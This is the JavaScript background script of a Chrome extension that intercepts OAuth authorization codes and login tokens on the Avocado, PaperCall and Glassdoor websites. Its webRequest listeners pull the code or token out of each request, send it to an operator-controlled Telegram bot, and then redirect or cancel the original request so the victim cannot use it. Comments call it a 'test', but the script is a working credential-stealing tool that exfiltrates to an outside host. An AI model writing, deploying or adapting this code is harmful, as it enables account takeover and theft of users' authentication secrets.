// INSERT YOUR TELEGRAM BOT DATA
let bot_data = {
    TOKEN: "",
    CHATID: ""
}



// GET request analyses test with Avocado and PaperCall websites. 
function logURL(requestDetails) {
    
    const regex = /.+:\/\/(?<domain>.+)\/.*code=(?<code>[^&|?]*).+/;
    const match = requestDetails.url.match(regex);

    let message = `New authorization code intercepted in the <b>domain</b>: ${match.groups.domain} with <b>code</b>: ${match.groups.code}`;


    fetch(`https://api.telegram.org/bot${bot_data.TOKEN}/sendMessage?chat_id=${bot_data.CHATID}&parse_mode=HTML&text=${message}`, { method: "GET" });


    if (requestDetails.url.startsWith('https://avocado.lol/')) {
        return {redirectUrl: 'https://avocado.lol/'}; 
    }
    else if (requestDetails.url.startsWith('https://www.papercall.io/')) {
        return {redirectUrl: 'https://www.papercall.io/'}; 
    }

    //return {cancel: true};
}
  


chrome.webRequest.onBeforeRequest.addListener(
    logURL,
    {urls: [
        "*://avocado.lol/google/*&code=*",
        "*://www.papercall.io/auth/google_oauth2/*&code=*",
        ]
    },
    ["blocking"]
);



// POST request analyses test with Glassdoor website. 
let glassdoor_cancel = false;

 chrome.webRequest.onBeforeRequest.addListener(
     function(details)
     {
        let formData = details['requestBody'].formData;
        let cancel = false;
        let message = "";
        if(formData) {
            Object.keys(formData).forEach(key => {
                if(key == "token") {
                    message = `New authorization code intercepted in the <b>domain</b>: www.glassdoor.com with <b>code</b>: ${formData[key]}`;
                    fetch(`https://api.telegram.org/bot${bot_data.TOKEN}/sendMessage?chat_id=${bot_data.CHATID}&parse_mode=HTML&text=${message}`, { method: "GET" });
                    glassdoor_cancel=true;
                }
                });
        }

        return {cancel: glassdoor_cancel};
     },

    
     {urls: ["*://www.glassdoor.it/*"]},
     ["blocking","requestBody"]
);

  